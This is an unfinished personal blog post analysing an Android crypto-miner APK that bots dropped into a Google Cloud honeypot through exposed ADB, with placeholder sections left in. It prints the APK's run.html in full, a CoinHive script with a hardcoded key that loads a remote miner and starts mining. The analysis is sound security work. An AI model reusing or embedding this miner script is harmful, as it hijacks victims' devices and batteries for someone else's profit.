---
slug: fishing-for-malware
title: Fishing for Malware
authors: [sid]
keywords: ['sid', 'lacy', 'blog', 'website', 'cybersecurity', 'security', 'computer', 'honeypot', 'malware', 'tech', 'network']
tags: [analysis, projects]
description: Analysis of malware dropped into my Google Cloud honeypot
summary: Analysis of malware dropped into my Google Cloud honeypot
date: 2022-01-20
---

Over the past 72 hours, I have left a [honeypot](https://usa.kaspersky.com/resource-center/threats/what-is-a-honeypot) ([T-Pot]((https://github.com/telekom-security/tpotce)), courtesy of [Telekom](https://github.com/telekom-security)) running, hosted on a VM instance in Google Cloud. After all, what better way to thank Google for the $400 of [free Cloud Compute resources](https://cloud.google.com/free/docs/gcp-free-tier) they gifted me than to attract malware-distributing bots and hackers directly to their data centers? I jest, but the results of the honeypot have been fascinating and insightful — from attack origins to the payloads and attempted exploits logged over the past few days, there is much to share. 

<!--truncate-->

First, however, I would like to reference the material that inspired and helped me set up the virtual environment for this post. My friend and peer Nathan Burns hosts a technical blog similar to mine at [*nburns.tech*](https://nburns.tech). Further, if you're interested in creating a honeypot of your own as Nathan and I have (which, mind you, is surprisingly accessible), I suggest you check out his tutorial, [*Installing and Configuring a Honeypot in Google Cloud*](https://nburns.tech/docs/Tutorials/honeypot_1). His two-part article does away with the complexity and ambiguity otherwise associated with this task and explains every step required to replicate our configurations in detail.

## Structure and Purpose

In this post, I will showcase the aggregate data collected for the duration of my honeypot's uptime. Then, I have examined a subsection of the malicious binaries received and attack surfaces exploited. I intend to — as a result — shed some light on how malicious actors execute non-targeted, automated attacks against the Internet of Things on a superficial level. Telekom's T-Pot resource collection is well suited to this task, exposing bait on the common vectors, such as SQL Injection, to the uncommon, such as wireless Android ADB.

Please note that, as with all content on my website, education is the only objective. By exposing strategies employed by malware authors, I hope only to contribute to the cybersecurity community and my knowledge. Please do not copy any of the techniques shown here for unethical purposes.

## Who is Attacking Me?

Insert map here.

## What is Attacking Me?

Insert subsection introduction here.

### Planted Binaries

#### Android

One of the most surprising aspects of this project to me was the volume of attacks on each exposed service; that is to say, the frequency of attacks did not seem to match the popularity or obscurity of target platforms. The best example of this, in my opinion, was the avalanche of requests towards Android ADB. What?

Yes, as it seems, there must be enough Android debugging bridges visible to the Internet to warrant the deployment of automated bots pushing Android malware. I have used ADB extensively in the past, experimenting with rooting Android devices, uninstalling bloatware (no, T-Mobile, Facebook should not be a system app), pushing custom Android ROMs, and more. That said, I have always used *USB* debugging. The reason any user would prefer to use wireless debugging, especially for actions involving a device reboot, is beyond me, though I assume it is a feature appreciated by some.

##### Crypto Miner

Information:
 - SHA-256: `0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257`
 - Package name: `com.ufo.miner`
 - Package type: Java Android APK
 - Size: 45.43 KB

[*See this file on VirusTotal*](https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257/detection)

As the subsection heading and package name imply, this is a crypto miner developed for execution on Android. However, that isn't particularly interesting on its own, and 45.43 KB is small — suspiciously small — so let's take a look inside the file. Contents:

```bash
$ unzip 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip 
Archive:  0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip
  inflating: META-INF/MANIFEST.MF    
  inflating: META-INF/CERT.SF        
  inflating: META-INF/CERT.RSA       
 extracting: res/drawable-xhdpi-v4/ic_launcher.png  
  inflating: AndroidManifest.xml     
 extracting: res/drawable-hdpi-v4/ic_launcher.png  
  inflating: res/layout/activity_main.xml  
  inflating: assets/run.html         
 extracting: resources.arsc          
 extracting: res/drawable-mdpi-v4/ic_launcher.png  
  inflating: classes.dex             
 extracting: res/drawable-xxhdpi-v4/ic_launcher.png  
  inflating: res/menu/main.xml     
  
$
```
I see an HTML file, some PNG images, and some other files, the extensions of which I am not familiar. Let's check them out.

```bash
$ cat assets/run.html
```
```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
    var miner = new CoinHive.Anonymous('fwW95bBFO91OKUsz1VhlMEQwxmDBz7XE',{
        threads:4,
        throttle: 0.8
});
    miner.start();
</script>
```

Sigh. It remains boring. *However,* by searching for the crypto wallet hardcoded into the HTML, I came across a presentation from [Fortinet](https://www.blackalps.ch/ba-18/files/talks/BlackAlps18-Axelle_Apvrille.pdf), indicating that this CoinHive-related malware may have been a part of the [Trinity Android P2P malware bot](https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/11/22/trinity_p2p_malware-8S4I.html), which *is* quite interesting. Alas, that is a rabbit hole for another blog post.

Each PNG was a rescaled version of the stock Android logo — not much to say beyond that.

How I assume this malware works:

1. The victim's stock web browser embeds into an app frame in the background.

2. Instructions are received from CoinHive.

3. The miner starts working, sending proof of work to the address hardcoded into the script.

4. The victim's phone gets too hot, or the battery drains too fast; upon seeing the culprit as *com.ufo.miner* in the power report of the device, the victim promptly uninstalls the application.

---

Sid Lacy  
[Email](mailto:contact@swlacy.com?subject=Hello!) • [LinkedIn](https://www.linkedin.com/in/lacysw/) • [GitHub](https://github.com/lacysw)